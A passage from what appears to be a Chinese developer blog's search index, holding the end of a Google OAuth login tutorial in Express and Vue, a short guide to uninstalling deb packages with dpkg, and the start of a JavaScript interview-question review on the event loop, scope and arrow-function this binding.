&#123; <span class="title class_">Router</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;express&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; google &#125; <span class="keyword">from</span> <span class="string">&#x27;googleapis&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="variable constant_">GOOGLE_OAUTH_CONFIG</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./config&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">GOOGLE_OAUTH_CONFIG</span> = &#123;</span><br><span class="line">  <span class="attr">clientID</span>: <span class="string">&#x27;xxxxxx&#x27;</span>,</span><br><span class="line">  <span class="attr">clientSecret</span>: <span class="string">&#x27;xxxxxx&#x27;</span>,</span><br><span class="line">  <span class="comment">// 该 uri 必须在 Google API 服务控制台中添加到『已获授权的重定向 URI』列表中</span></span><br><span class="line">  <span class="attr">redirectUri</span>: <span class="string">&#x27;https://localhost:5173/api/oauth/sign?type=google&#x27;</span>,</span><br><span class="line">  <span class="comment">// 申请获取用户资料以及邮箱信息</span></span><br><span class="line">  <span class="attr">scope</span>: [</span><br><span class="line">    <span class="string">&#x27;https://www.googleapis.com/auth/userinfo.profile&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https://www.googleapis.com/auth/userinfo.email&#x27;</span>,</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> googleOAuth2Client = <span class="keyword">new</span> google.<span class="property">auth</span>.<span class="title class_">OAuth2</span>(</span><br><span class="line">  <span class="variable constant_">GOOGLE_OAUTH_CONFIG</span>.<span class="property">clientID</span>,</span><br><span class="line">  <span class="variable constant_">GOOGLE_OAUTH_CONFIG</span>.<span class="property">clientSecret</span>,</span><br><span class="line">  <span class="variable constant_">GOOGLE_OAUTH_CONFIG</span>.<span class="property">redirectUri</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getGoogleOAuthUrl</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> googleOAuth2Client.<span class="title function_">generateAuthUrl</span>(&#123;</span><br><span class="line">    <span class="attr">access_type</span>: <span class="string">&#x27;offline&#x27;</span>,</span><br><span class="line">    <span class="attr">scope</span>: <span class="variable constant_">GOOGLE_OAUTH_CONFIG</span>.<span class="property">scope</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> oAuthRouter = <span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 登录跳转页实现</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">oAuthRouter.<span class="title function_">get</span>(<span class="string">&#x27;/passport&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; type &#125; = req.<span class="property">query</span>;</span><br><span class="line">  <span class="keyword">if</span> (!type) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;缺少参数&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 生成第三方应用登录授权页的 URL</span></span><br><span class="line">  <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;google&#x27;</span>:</span><br><span class="line">      res.<span class="title function_">redirect</span>(<span class="title function_">getGoogleOAuthUrl</span>());</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="attr">default</span>:</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;不支持的登录类型&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 授权成功页实现</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">oAuthRouter.<span class="title function_">get</span>(<span class="string">&#x27;/sign&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> query = req.<span class="property">query</span>;</span><br><span class="line">  <span class="keyword">if</span> (!query.<span class="property">type</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;缺少参数&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">switch</span> (query.<span class="property">type</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;google&#x27;</span>:</span><br><span class="line">      <span class="comment">// 根据 code 获取用户信息</span></span><br><span class="line">      <span class="keyword">const</span> &#123; tokens &#125; = <span class="keyword">await</span> googleOAuth2Client.<span class="title function_">getToken</span>(query.<span class="property">code</span>);</span><br><span class="line">      googleOAuth2Client.<span class="title function_">setCredentials</span>(tokens);</span><br><span class="line">      <span class="comment">// 获取用户邮箱</span></span><br><span class="line">      <span class="keyword">const</span> &#123; data &#125; = <span class="keyword">await</span> googleOAuth2Client.<span class="title function_">request</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;https://www.googleapis.com/oauth2/v1/userinfo&#x27;</span>,</span><br><span class="line">      &#125;);</span><br><span class="line">      <span class="keyword">const</span> &#123; id, name, email &#125; = data <span class="keyword">as</span> any;</span><br><span class="line">      <span class="comment">// 植入 cookie（简单示例，生产环境下应遵循 Token 规范并植入 http only 类型的 cookie）</span></span><br><span class="line">      res.<span class="title function_">cookie</span>(<span class="string">&#x27;user&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; id, name, email &#125;));</span><br><span class="line">      <span class="comment">// 重定向到登录成功落地页</span></span><br><span class="line">      res.<span class="title function_">redirect</span>(<span class="string">&#x27;/auto_login.html&#x27;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="attr">default</span>:</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;不支持的登录类型&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> oAuthRouter;</span><br></pre></td></tr></table></figure><h1 id="2-客户端实现"><a href="#2-客户端实现" class="headerlink" title="2. 客户端实现"></a>2. 客户端实现</h1><h3 id="客户端应用登录入口页面的实现"><a href="#客户端应用登录入口页面的实现" class="headerlink" title="客户端应用登录入口页面的实现"></a>客户端应用登录入口页面的实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;oauth-page&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;card-area&quot;&gt;</span><br><span class="line">      &lt;el-button @click=&quot;onAuthBtnClick(&#x27;google&#x27;)&quot;&gt;Google Auth&lt;/el-button&gt;</span><br><span class="line">      &lt;el-button @click=&quot;onAuthBtnClick(&#x27;facebook&#x27;)&quot;&gt;Facebook Auth&lt;/el-button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div v-if=&quot;userInfo&quot; class=&quot;card-area&quot;&gt;</span><br><span class="line">      &#123;&#123; userInfo &#125;&#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; PickServerReq &#125; from &#x27;@express-vue-template/types/api&#x27;;</span><br><span class="line">import &#123;</span><br><span class="line">  GET_OAUTH_PASSPORT_API,</span><br><span class="line">  OAuthType,</span><br><span class="line">&#125; from &#x27;@express-vue-template/types/api/oauth&#x27;;</span><br><span class="line">import &#123; defineComponent &#125; from &#x27;vue&#x27;;</span><br><span class="line"></span><br><span class="line">export default defineComponent(&#123;</span><br><span class="line">  name: &#x27;OAuthPage&#x27;,</span><br><span class="line">  setup() &#123;</span><br><span class="line">    const targetId = ref(new Date().valueOf().toString());</span><br><span class="line">    const oAuthWindow = ref&lt;Window | null&gt;(null);</span><br><span class="line">    const userInfo = ref();</span><br><span class="line"></span><br><span class="line">    function onAuthBtnClick(authType: OAuthType) &#123;</span><br><span class="line">  // 构建登录跳转页 URL 并打开</span><br><span class="line">      const query = new URLSearchParams(&#123; type: authType &#125; as PickServerReq&lt;</span><br><span class="line">        typeof GET_OAUTH_PASSPORT_API</span><br><span class="line">      &gt;);</span><br><span class="line">      const url = `$&#123;window.location.origin&#125;/api/oauth/passport?$&#123;query&#125;`;</span><br><span class="line">      const newWindow = window.open(</span><br><span class="line">        url,</span><br><span class="line">        targetId.value,</span><br><span class="line">        &#x27;width=500,height=500&#x27;</span><br><span class="line">      );</span><br><span class="line">      if (newWindow) &#123;</span><br><span class="line">        oAuthWindow.value = newWindow;</span><br><span class="line">      &#125;</span><br><span class="line">      // 对新窗口进行 postMessage 轮询，验证是否授权完成</span><br><span class="line">      setInterval(() =&gt; &#123;</span><br><span class="line">        newWindow?.postMessage(&#x27;is-auth-finished&#x27;, &#x27;*&#x27;);</span><br><span class="line">      &#125;, 1000);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onReceivedMessage(event: MessageEvent) &#123;</span><br><span class="line">  // 收到登录成功的消息后，关闭登录窗口并获取用户信息</span><br><span class="line">      if (event.data === &#x27;auth-finished&#x27;) &#123;</span><br><span class="line">        oAuthWindow.value?.close();</span><br><span class="line">        getUserInfo();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getUserInfo() &#123;</span><br><span class="line">      // 读取服务端种的 cookie（简单示例，生产环境下应调用接口获取用户信息）</span><br><span class="line">      const userCookie = document.cookie</span><br><span class="line">        .split(&#x27;; &#x27;)</span><br><span class="line">        .find((row) =&gt; row.startsWith(&#x27;user=&#x27;));</span><br><span class="line">      if (userCookie) &#123;</span><br><span class="line">        userInfo.value = userCookie.split(&#x27;=&#x27;)[1];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    onMounted(() =&gt; &#123;</span><br><span class="line">      window.addEventListener(&#x27;message&#x27;, onReceivedMessage);</span><br><span class="line">      getUserInfo();</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    onUnmounted(() =&gt; &#123;</span><br><span class="line">      window.removeEventListener(&#x27;message&#x27;, onReceivedMessage);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">      onAuthBtnClick,</span><br><span class="line">      userInfo,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="登录成功落地页"><a href="#登录成功落地页" class="headerlink" title="登录成功落地页"></a>登录成功落地页</h3><p>当登录成功后，会跳转到 <code>/auto_login.html</code> 页面，这是一个简单的 HTML 页面，只用于与父页面进行通信（或进行其他后续必要操作）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login... ...<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    Loading... ...</span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 通知父窗口授权完成</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (event.<span class="property">data</span> === <span class="string">&#x27;is-auth-finished&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          event.<span class="property">source</span>.<span class="title function_">postMessage</span>(<span class="string">&#x27;auth-finished&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 项目实践 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OAuth </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu 如何卸载 deb 安装的第三方应用</title>
      <link href="/2023/04/fbc3f997c608.html"/>
      <url>/2023/04/fbc3f997c608.html</url>
      
        <content type="html"><![CDATA[<p>如果你是在 Ubuntu 应用商店中安装的应用，可以通过查看『已安装』面板进行卸载，但是假如你使用 <code>.deb</code> 文件安装了第三方应用，是无法通过应用商店进行写在的，这时就需要通过指令卸载。</p><p>首先通过 <code>dpkg</code> 命令列出你已经安装的应用，可以使用 <code>grep</code> 指令进行过滤：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg --list | grep app_name</span><br></pre></td></tr></table></figure><p>之后可以在终端中使用 <code>dpkg -r</code> 来卸载该应用程序：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -r app_name</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面试中遇到的高频问题整理</title>
      <link href="/2023/03/995d42541244.html"/>
      <url>/2023/03/995d42541244.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-JavaScript-相关"><a href="#1-JavaScript-相关" class="headerlink" title="1. JavaScript 相关"></a>1. JavaScript 相关</h1><h2 id="1-1-基础概念类"><a href="#1-1-基础概念类" class="headerlink" title="1.1 基础概念类"></a>1.1 基础概念类</h2><h3 id="JavaScript-中的数据类型"><a href="#JavaScript-中的数据类型" class="headerlink" title="JavaScript 中的数据类型"></a>JavaScript 中的数据类型</h3><ul><li>八大基本数据类型（含 ES6）：Undefined Null Number String Boolean Object Symbol BitInt</li><li>原始类型：String Number Boolean Null Undefined Symbol</li><li>引用类型：Object Array Function RegExp Date</li></ul><h3 id="原型与原型链"><a href="#原型与原型链" class="headerlink" title="原型与原型链"></a>原型与原型链</h3><p>重点：</p><ul><li>对原型与原型链的理解</li><li>基于原型链的查找逻辑<ul><li>显式原型与隐式原型的区别</li></ul></li><li>为什么要设计原型与原型链机制</li></ul><h3 id="任务队列"><a href="#任务队列" class="headerlink" title="任务队列"></a>任务队列</h3><p><a href="https://juejin.cn/post/6979876135182008357">参考文章</a></p><p>重点：</p><ul><li>为什么要设计异步</li><li>任务队列的执行过程</li><li>给一段代码，要求说出输出结果 <a href="https://blog.csdn.net/m0_46512929/article/details/117462053">练习题</a></li></ul><h3 id="new-一个对象发生了什么"><a href="#new-一个对象发生了什么" class="headerlink" title="new 一个对象发生了什么"></a>new 一个对象发生了什么</h3><ol><li>创建一个新对象</li><li>新对象的隐式原型 <code>__proto__</code> 指向构造函数的显示原型 <code>prototype</code></li><li>将构造函数中的 <code>this</code> 指向新对象</li><li>执行构造函数</li><li>返回新对象（如果构造函数返回一个对象，返回该对象）</li></ol><p>关联：[[面试中遇到的高频问题整理#实现 new 方法]]</p><h3 id="宏任务与微任务"><a href="#宏任务与微任务" class="headerlink" title="宏任务与微任务"></a>宏任务与微任务</h3><p>简单示例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="title function_">alert</span>(<span class="string">&quot;timeout&quot;</span>));</span><br><span class="line"><span class="title class_">Promise</span>.<span class="title function_">resolve</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> <span class="title function_">alert</span>(<span class="string">&quot;promise&quot;</span>));</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;code&quot;</span>);</span><br></pre></td></tr></table></figure><p>执行顺序：</p><ol><li><code>code</code>  首先显示，因为它是常规的同步调用。</li><li><code>promise</code>  第二个出现，因为  <code>then</code>  会通过微任务队列，并在当前代码之后执行。</li><li><code>timeout</code>  最后显示，因为它是一个宏任务。</li></ol><p>要点：</p><ul><li>微任务会在执行任何其他事件处理，或渲染，或执行任何其他宏任务之前完成</li><li>每个宏任务执行时都会去先检查微任务队列里是否有微任务，如果有则先清空微任务队列</li></ul><p><a href="https://github.com/EsunR/KnowledgePoint-Collection/blob/master/Note/KnowledgePoint/5_%E5%AE%8F%E4%BB%BB%E5%8A%A1%E5%BE%AE%E4%BB%BB%E5%8A%A1%E4%BB%A5%E5%8F%8A%E4%BA%8B%E4%BB%B6%E8%BD%AE%E8%AF%A2.md">参考示例</a></p><p>注意，<code>new Promise</code> 的处理函数中执行的代码也是同步执行的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;script start&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;sync task&quot;</span>);</span><br><span class="line">  <span class="title function_">resolve</span>();</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;micro start&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;script end&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">script start</span></span><br><span class="line"><span class="comment">sync task</span></span><br><span class="line"><span class="comment">script end</span></span><br><span class="line"><span class="comment">micro start</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>如果题目中使用了 async 和 await，可以改写为 Promise 链，这样就不迷糊了，如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">async1</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;async1 start&quot;</span>);</span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">async2</span>();</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;async1 end&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">async2</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;async2&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>等同于:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">async1</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;async1 start&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">async2</span>().<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;async1 end&quot;</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">async2</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;async2&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">resolve</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="JavaScript-作用域"><a href="#JavaScript-作用域" class="headerlink" title="JavaScript 作用域"></a>JavaScript 作用域</h3><p>词法作用域（也叫静态作用域）从字面意义上看是说作用域在词法化阶段（通常是编译阶段）确定而非执行阶段确定的。看例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> number = <span class="number">42</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">printNumber</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(number);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">log</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> number = <span class="number">54</span>;</span><br><span class="line">  <span class="title function_">printNumber</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Prints 42</span></span><br><span class="line"><span class="title function_">log</span>();</span><br></pre></td></tr></table></figure><p>上面代码可以看出无论 <code>printNumber()</code> 在哪里调用 <code>console.log(number)</code> 都会打印 <code>42</code>。动态作用域不同，<code>console.log(number)</code> 这行代码打印什么取决于函数 <code>printNumber()</code> 在哪里调用。</p><h3 id="箭头函数的-this-指向"><a href="#箭头函数的-this-指向" class="headerlink" title="箭头函数的 this 指向"></a>箭头函数的 this 指向</h3><p>在非显示绑定和 new 绑定时，普通函数中的 this 总是指向调用该函数的对象，但是在箭头函数中， this 的指向是根据外层作用域来决定的，换句话说，就是箭头函数被定义时的上下文中（词法作用域内）的 this。此外箭头函数也无法使用 call apply bind 来显式绑定 this。</p><p>示例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 非严格模式</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">&quot;window&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person1 = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;person1&quot;</span>,</span><br><span class="line">  <span class="attr">show1</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">show2</span>: <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>),</span><br><span class="line">  <span class="attr">show3</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">show4</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> person2 = &#123; <span class="attr">name</span>: <span class="string">&quot;person2&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line">person1.<span class="title function_">show1</span>(); <span class="comment">// person1，隐式绑定，this指向调用者 person1</span></span><br><span class="line">person1.<span class="property">show1</span>.<span class="title function_">call</span>(person2); <span class="comment">// person2，显式绑定，this指向 person2</span></span><br><span class="line"></span><br><span class="line">person1.<span class="title function_">show2</span>(); <span class="comment">// window，箭头函数绑定，this指向外层作用域，即全局作用域</span></span><br><span class="line">person1.<span class="property">show2</span>.<span class="title function_">call</span>(person2); 